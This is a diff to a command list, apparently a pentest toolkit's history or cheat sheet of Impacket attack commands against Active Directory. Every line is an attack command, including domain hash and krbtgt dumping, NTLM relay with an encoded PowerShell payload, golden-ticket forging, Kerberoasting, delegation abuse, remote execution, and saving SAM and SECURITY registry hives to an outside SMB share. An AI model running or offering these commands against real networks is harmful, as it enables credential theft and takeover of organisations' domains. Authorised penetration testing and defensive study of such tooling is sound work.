@@ -14,7 +14,6 @@ secretsdump.py -ldapfilter '(&(objectClass=user)(adminCount=1))' -just-dc -hashe
 secretsdump.py -no-pass "$DOMAIN"/'DC01$'@"$DC_HOST"
 secretsdump.py -outputfile "$DOMAIN" -just-dc -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
 secretsdump.py -just-dc-user krbtgt -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
-KRB5CCNAME="$CCACHE_PATH" secretsdump -just-dc-user 'krbtgt' -dc-ip "$DC_HOST" -k -no-pass @"$DC_HOST"
 KRB5CCNAME="$CCACHE_PATH" getST.py -self -impersonate 'domainadmin' -altservice "cifs/$TARGET" -k -no-pass -dc-ip "$DC_HOST" "$DOMAIN"/"$TARGET\$"
 getST.py -self -impersonate 'domainadmin' -altservice "cifs/$TARGET" -k -no-pass -dc-ip "$DC_HOST" "$DOMAIN"/"$TARGET\$"
 getST.py -spn "host/$TARGET" -impersonate 'domainadmin' -dc-ip "$DC_IP" "$DOMAIN"/'NIHIL-01$':'nihil4thewin'
@@ -22,16 +21,6 @@ getST.py -spn CIFS/"$TARGET" -impersonate Administrator -dc-ip "$DC_IP" "$DOMAIN
 getTGT.py -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
 renameMachine.py -current-name 'testcomputer$' -new-name 'DC01' -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
 renameMachine.py -current-name 'DC01' -new-name 'testcomputer$' -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
-ntlmrelayx -t "https://pki.$DOMAIN/certsrv/certfnsh.asp" -smb2support --adcs --template "KerberosAuthentication"
-ntlmrelayx -t ldaps://"$DC_HOST" -smb2support --remove-mic --shadow-credentials --shadow-target 'dc01$'
-ntlmrelayx -t dcsync://"$DC_HOST" -smb2support
-ntlmrelayx -t "ldaps://$DC_HOST" --http-port 80 --no-dump --no-smb-server --delegate-access --escalate-user 'NIHIL-01$'
-ntlmrelayx -t ldaps://"$DC_HOST" --http-port 80 --no-dump --no-smb-server --delegate-access --add-computer 'NIHIL-01' 'nihil4thewin'
-ntlmrelayx -t ldaps://"$DC_HOST" -smb2support --remove-mic --delegate-access --add-computer 'NIHIL-01' 'nihil4thewin'
-ntlmrelayx -t ldap://"$DC_HOST" -smb2support --interactive
-ntlmrelayx -tf targets.txt -w --ipv6 -smb2support --lootdir ntlmrelayx_lootdir --http-port 3128,80
-Get-GPPPassword -debug -no-pass "$DC_HOST"
-Get-GPPPassword "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
 ms14-068.py -u "$USER"@"$DOMAIN" --rc4 "$NT_HASH" -s "$DOMAIN_SID" -d "$DC_HOST"
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip "$DC_IP" "$DOMAIN"/
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
@@ -103,15 +92,6 @@ secretsdump.py "$DOMAIN/$USER:$PASSWORD"@"$IP" -just-dc-user "$TARGET_USER"
 secretsdump.py "$DOMAIN/$USER:$PASSWORD"@"$IP" -just-dc-user "$DOMAIN"/krbtgt
 secretsdump.py -k -no-pass "$DOMAIN/$USER@DC" -dc-ip "$IP" -target-ip "$IP"
 secretsdump.py -hashes :"$NT_HASH" "$DOMAIN/$USER"@"$IP"
-ntlmrelayx -smb2support -t smb://"$IP"
-ntlmrelayx -tf relay_targets.txt -smb2support -i
-ntlmrelayx --no-http-server -smb2support -t "$IP"
-ntlmrelayx --no-http-server -smb2support -t "$IP" -c 'powershell -e "$BASE64"'
-ntlmrelayx -t ldap://"$IP" --delegate-access --escalate-user "$USER"
-ntlmrelayx -t ldaps://"$IP" -debug --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs
-ntlmrelayx -6 -t ldaps://"$IP" -wh wpad."$DOMAIN" -l loot
-ntlmrelayx -t http://"$IP"/certsrv/certfnsh.asp --adcs -smb2support --template DomainController
-ntlmrelayx -t http://"$IP"/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
 owneredit.py -action write -new-owner "$NEW_OWNER" -target "$TARGET" "$DOMAIN/$USER:$PASSWORD"
 dacledit.py -action read -dc-ip "$IP" -target "$TARGET" "$DOMAIN/$USER:$PASSWORD"
 dacledit.py -action write -rights DCSync -principal "$USER" -target-dn 'DC=domain,DC=local' "$DOMAIN/$USER:$PASSWORD"
@@ -139,3 +119,176 @@ mssqlclient.py "$DOMAIN/$USER:$PASSWORD"@"$IP"
 mssqlclient.py "$USER@$IP" -windows-auth
 proxychains psexec.py "$DOMAIN/$USER:$PASSWORD"@"$IP"
 proxychains wmiexec.py "$DOMAIN/$USER:$PASSWORD"@"$IP"
+rbcd -delegate-from "$USER" -delegate-to 'sv01$' -dc-ip "$DC_IP" -action remove "$DOMAIN"/"$USER":"$PASSWORD"
+rbcd -delegate-from "$USER" -delegate-to 'sv01$' -dc-ip "$DC_IP" -action write "$DOMAIN"/"$USER":"$PASSWORD"
+rbcd -delegate-to 'sv01$' -dc-ip "$DC_IP" -action read "$DOMAIN"/"$USER":"$PASSWORD"
+describeTicket "$CCACHE_PATH"
+describeTicket "$KRB5CCNAME"
+ntlmrelayx -t "https://pki.$DOMAIN/certsrv/certfnsh.asp" -smb2support --adcs --template "KerberosAuthentication"
+ntlmrelayx -t ldaps://"$DC_HOST" -smb2support --remove-mic --shadow-credentials --shadow-target 'dc01$'
+ntlmrelayx -t dcsync://"$DC_HOST" -smb2support
+ntlmrelayx -t "ldaps://$DC_HOST" --http-port 80 --no-dump --no-smb-server --delegate-access --escalate-user 'NIHIL-01$'
+ntlmrelayx -t ldaps://"$DC_HOST" --http-port 80 --no-dump --no-smb-server --delegate-access --add-computer 'NIHIL-01' 'nihil4thewin'
+ntlmrelayx -t ldaps://"$DC_HOST" -smb2support --remove-mic --delegate-access --add-computer 'NIHIL-01' 'nihil4thewin'
+ntlmrelayx -t ldap://"$DC_HOST" -smb2support --interactive
+ntlmrelayx -tf targets.txt -w --ipv6 -smb2support --lootdir ntlmrelayx_lootdir --http-port 3128,80
+ntlmrelayx -smb2support -t smb://"$IP"
+ntlmrelayx -tf relay_targets.txt -smb2support -i
+ntlmrelayx --no-http-server -smb2support -t "$IP"
+ntlmrelayx --no-http-server -smb2support -t "$IP" -c 'powershell -e "$BASE64"'
+ntlmrelayx -t ldap://"$IP" --delegate-access --escalate-user "$USER"
+ntlmrelayx -t ldaps://"$IP" -debug --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs
+ntlmrelayx -6 -t ldaps://"$IP" -wh wpad."$DOMAIN" -l loot
+ntlmrelayx -t http://"$IP"/certsrv/certfnsh.asp --adcs -smb2support --template DomainController
+ntlmrelayx -t http://"$IP"/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+Get-GPPPassword -debug -no-pass "$DC_HOST"
+Get-GPPPassword "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
+KRB5CCNAME="$CCACHE_PATH" secretsdump -just-dc-user 'krbtgt' -dc-ip "$DC_HOST" -k -no-pass @"$DC_HOST"
+CheckLDAPStatus -dc-ip "$DC_IP" -domain "$DOMAIN"
+DumpNTLMInfo "$TARGET"
+GetADComputers "$DOMAIN"/"$USER":"$PASSWORD"
+GetLAPSPassword "$DOMAIN"/"$USER":"$PASSWORD"
+attrib "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" C$ '\\Windows\\Temp' '\\Windows\\Temp\\file.txt'
+badsuccessor -dmsa-name "$TARGET" "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
+checkMSSQLStatus "$TARGET"
+dpapi masterkey -file "$FILE" -password "$PASSWORD"
+dpapidump -userkey "$FILE" "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+esentutl "$FILE"
+exchanger "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+filetime "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" C$ '\\Windows\\Temp\\file.txt'
+getArch -target "$TARGET"
+goldenPac "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" whoami
+karmaSMB -config "$FILE"
+keylistattack "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST" -rodcNo "$TARGET" -rodcKey "$KEY"
+machine_role "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+mimikatz "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+mqtt_check -host "$TARGET" -port 1883
+mssqlinstance "$TARGET"
+netview "$DOMAIN"/"$USER":"$PASSWORD" -target "$TARGET"
+ntfs-read "$FILE" -extract '\\Windows\\System32\\config\\SAM'
+registry-read "$FILE"
+regsecrets "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+rdp_check "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+rpcmap 'ncacn_ip_tcp:'"$TARGET"'[135]'
+sambaPipe "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" -so "$FILE"
+samedit -password "$PASSWORD" "$USER" SAM -system SYSTEM
+services "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+ticketConverter "$FILE" ticket.ccache
+tstool "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+wmipersist "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+wmiquery "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+findDelegation -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
+reg "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SAM' -o '\\192.168.56.1\SHUTDOWN'
+reg "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.1\SHUTDOWN'
+reg "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SECURITY' -o '\\192.168.56.1\SHUTDOWN'
+reg "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" backup -o '\\192.168.56.1\SHUTDOWN'
+smbserver -smb2support NIHIL .
+secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
+secretsdump -ntds ntds.dit.save -system system.save LOCAL
+secretsdump "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
+secretsdump -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
+secretsdump -k "$TARGET"
+secretsdump -ldapfilter '(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2))' -just-dc -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
+secretsdump -ldapfilter '(&(objectClass=user)(adminCount=1))' -just-dc -hashes :"$NT_HASH" "$DOMAIN"/Administrator@"$DC_HOST"
+secretsdump -no-pass "$DOMAIN"/'DC01$'@"$DC_HOST"
+secretsdump -outputfile "$DOMAIN" -just-dc -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
+secretsdump -just-dc-user krbtgt -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
+KRB5CCNAME="$CCACHE_PATH" getST -self -impersonate 'domainadmin' -altservice "cifs/$TARGET" -k -no-pass -dc-ip "$DC_HOST" "$DOMAIN"/"$TARGET\$"
+getST -self -impersonate 'domainadmin' -altservice "cifs/$TARGET" -k -no-pass -dc-ip "$DC_HOST" "$DOMAIN"/"$TARGET\$"
+getST -spn "host/$TARGET" -impersonate 'domainadmin' -dc-ip "$DC_IP" "$DOMAIN"/'NIHIL-01$':'nihil4thewin'
+getST -spn CIFS/"$TARGET" -impersonate Administrator -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
+getTGT -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
+renameMachine -current-name 'testcomputer$' -new-name 'DC01' -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
+renameMachine -current-name 'DC01' -new-name 'testcomputer$' -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
+ms14-068 -u "$USER"@"$DOMAIN" --rc4 "$NT_HASH" -s "$DOMAIN_SID" -d "$DC_HOST"
+GetNPUsers -request -format hashcat -outputfile ASREProastables.txt -dc-ip "$DC_IP" "$DOMAIN"/
+GetNPUsers -request -format hashcat -outputfile ASREProastables.txt -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
+GetNPUsers -request -format hashcat -outputfile ASREProastables.txt -hashes :"$NT_HASH" -dc-ip "$DC_IP" "$DOMAIN"/"$USER"
+GetNPUsers -request -format hashcat -outputfile ASREProastables.txt -usersfile users.txt -dc-ip "$DC_IP" "$DOMAIN"/
+GetUserSPNs -outputfile Kerberoastables.txt -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD" -target-domain "$TARGET_DOMAIN"
+GetUserSPNs -outputfile Kerberoastables.txt -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
+GetUserSPNs -outputfile Kerberoastables.txt -hashes :"$NT_HASH" -dc-ip "$DC_IP" "$DOMAIN"/"$USER"
+GetUserSPNs -outputfile Kerberoastables.txt -no-preauth "$USER" -usersfile "services.txt" -dc-host "$DC_IP" "$DOMAIN"/
+addcomputer -computer-name 'SHUTDOWN$' -computer-pass '123soleil!' -dc-host DC01 -domain-netbios "$DOMAIN" "$DOMAIN"/"$USER":"$PASSWORD"
+addcomputer -delete -computer-name 'SHUTDOWN$' -dc-host DC01 -domain-netbios "$DOMAIN" "$DOMAIN"/"$USER":"$PASSWORD"
+dacledit -action write -rights DCSync -principal 'owneduser' -target-dn 'DC=DOMAIN,DC=LOCAL' "$DOMAIN"/"$USER":"$PASSWORD"
+wmiexec "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+wmiexec -codec cp850 -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
+wmiexec -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
+wmiexec -k "$TARGET"
+ticketer -nthash "$NT_HASH" -domain-sid S-1-5-11-39129514-1145628974-103568174 -domain "$DOMAIN" randomuser
+ticketer -nthash "$NT_HASH" -spn HOST/"$TARGET" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" randomuser
+smbexec "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+smbexec -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
+smbexec -share 'ADMIN$' -k "$TARGET"
+rpcdump "$DC_HOST" | grep -A 6 MS-RPRN
+lookupsid "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST" 0
+lookupsid -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST" 0
+psexec "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+psexec -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
+dcomexec "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+dcomexec -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
+atexec "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+atexec -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
+changepasswd -newpass '123Pentest!!!' "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
+changepasswd -newpass '123Pentest!!!' -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
+owneredit -action write -new-owner "$NEW_OWNER" -target "$TARGET_OBJECT" "$DOMAIN"/"$USER":"$PASSWORD"
+mssqlclient "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+proxychains atexec -no-pass "$DOMAIN"/"$USER"@"$TARGET"
+proxychains dcomexec -no-pass "$DOMAIN"/"$USER"@"$TARGET"
+proxychains psexec -no-pass "$DOMAIN"/"$USER"@"$TARGET"
+proxychains secretsdump -no-pass "$DOMAIN"/"$USER"@"$TARGET"
+proxychains smbexec -no-pass "$DOMAIN"/"$USER"@"$TARGET"
+proxychains wmiexec -no-pass "$DOMAIN"/"$USER"@"$TARGET"
+secretsdump -k -outputfile "$DOMAIN" "$DC_HOST"
+rpcdump @"$IP" | egrep 'MS-RPRN|MS-PAR'
+mssqlclient "$USER":"$PASSWORD"@"$IP" -p 1433
+mssqlclient -p 1433 "$USER"@"$IP" -windows-auth
+mssqlclient "$DOMAIN"/"$USER":"$PASSWORD"@"$IP"
+GetNPUsers -dc-ip "$IP" "$DOMAIN/" -usersfile "$USERLIST" -format hashcat -outputfile asreproast.txt
+GetNPUsers -usersfile "$USERLIST" -request -format hashcat -outputfile asrep.txt -dc-ip "$IP" -no-pass "$DOMAIN/$USER"
+GetUserSPNs -dc-ip "$IP" "$DOMAIN/$USER:$PASSWORD" -request
+GetUserSPNs -dc-ip "$IP" "$DOMAIN/$USER:$PASSWORD" -request -outputfile kerb.txt
+psexec "$DOMAIN/$USER"@"$IP" -hashes :"$NT_HASH"
+psexec administrator:"$PASSWORD"@"$IP"
+psexec "$DOMAIN"/"$USER"@"$IP" -hashes :"$NT_HASH"
+wmiexec "$DOMAIN"/"$USER":"$PASSWORD"@"$IP"
+dcomexec -object MMC20 "$DOMAIN"/"$USER":"$PASSWORD"@"$IP"
+getTGT "$DOMAIN/$USER:$PASSWORD" -dc-ip "$IP"
+getTGT "$DOMAIN/$USER" -hashes :"$NT_HASH" -dc-ip "$IP"
+getST "$DOMAIN/$USER" -impersonate "$TARGET_USER" -dc-ip "$IP" -spn "CIFS/DC"
+ticketer -nthash "$NT_HASH" -domain "$DOMAIN" -domain-sid "$DOMAIN_SID" -extra-sid "$PARENT_SID"-519 "$DUMMY_USER"
+ticketer -nthash "$NT_HASH" -spn "$HOST"/"$TARGET" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" randomuser
+secretsdump "$DOMAIN/$USER:$PASSWORD"@"$IP"
+secretsdump "$DOMAIN/$USER:$PASSWORD"@"$IP" -just-dc
+secretsdump "$DOMAIN/$USER:$PASSWORD"@"$IP" -just-dc-user "$TARGET_USER"
+secretsdump "$DOMAIN/$USER:$PASSWORD"@"$IP" -just-dc-user "$DOMAIN"/krbtgt
+secretsdump -k -no-pass "$DOMAIN/$USER@DC" -dc-ip "$IP" -target-ip "$IP"
+secretsdump -hashes :"$NT_HASH" "$DOMAIN/$USER"@"$IP"
+owneredit -action write -new-owner "$NEW_OWNER" -target "$TARGET" "$DOMAIN/$USER:$PASSWORD"
+dacledit -action read -dc-ip "$IP" -target "$TARGET" "$DOMAIN/$USER:$PASSWORD"
+dacledit -action write -rights DCSync -principal "$USER" -target-dn 'DC=domain,DC=local' "$DOMAIN/$USER:$PASSWORD"
+changepasswd -newpass "$NEW_PASSWORD" "$DOMAIN/$USER:$PASSWORD"@"$IP"
+changepasswd -newpass "$NEW_PASSWORD" -hashes :"$NT_HASH" "$DOMAIN/$USER"@"$TARGET"
+findDelegation "$DOMAIN/$USER:$PASSWORD"
+findDelegation -user "$TARGET_USER" "$DOMAIN/$USER:$PASSWORD"
+addcomputer -computer-name "$COMPUTER_NAME$" -computer-pass "$PASSWORD" -dc-host "$TARGET" -domain-netbios "$DOMAIN" "$DOMAIN/$USER:$PASSWORD"
+addcomputer -delete -computer-name "$COMPUTER_NAME$" -dc-host "$TARGET" -domain-netbios "$DOMAIN" "$DOMAIN/$USER:$PASSWORD"
+rbcd -delegate-from "$COMPUTER_NAME$" -delegate-to "$TARGET\$" -action write "$DOMAIN/$USER:$PASSWORD" -dc-ip "$IP"
+rbcd -delegate-to "$TARGET\$" -dc-ip "$IP" -action read "$DOMAIN/$USER:$PASSWORD"
+getST "$DOMAIN/$COMPUTER_NAME$" -spn "cifs/$TARGET" -impersonate "$ADMIN_USER" -dc-ip "$IP"
+getST -self -impersonate Administrator -altservice "cifs/$TARGET" -k -no-pass -dc-ip "$IP" "$DOMAIN/$TARGET\$"
+renameMachine -current-name "$COMPUTER_NAME$" -new-name "$TARGET" -dc-ip "$IP" "$DOMAIN/$USER:$PASSWORD"
+lookupsid "$DOMAIN/$USER:$PASSWORD"@"$IP"
+lookupsid "$DOMAIN/$USER:$PASSWORD"@"$IP" | grep "Domain SID"
+raiseChild -target-exec "$TARGET" "$DOMAIN/$USER"
+secretsdump -just-dc-ntlm "$DOMAIN/$DUMMY_USER@$TARGET" -k -no-pass -target-ip "$TARGET"
+findDelegation -dc-ip "$IP" "$DOMAIN/$USER:$PASSWORD"
+psexec "$DOMAIN/$USER:$PASSWORD"@"$IP"
+wmiexec "$DOMAIN/$USER:$PASSWORD"@"$IP" "$COMMAND"
+dcomexec -object MMC20 "$DOMAIN/$USER:$PASSWORD"@"$IP"
+atexec -hashes :"$NT_HASH" "$DOMAIN/$USER"@"$TARGET"
+mssqlclient "$DOMAIN/$USER:$PASSWORD"@"$IP"
+mssqlclient "$USER@$IP" -windows-auth
+proxychains psexec "$DOMAIN/$USER:$PASSWORD"@"$IP"
+proxychains wmiexec "$DOMAIN/$USER:$PASSWORD"@"$IP"
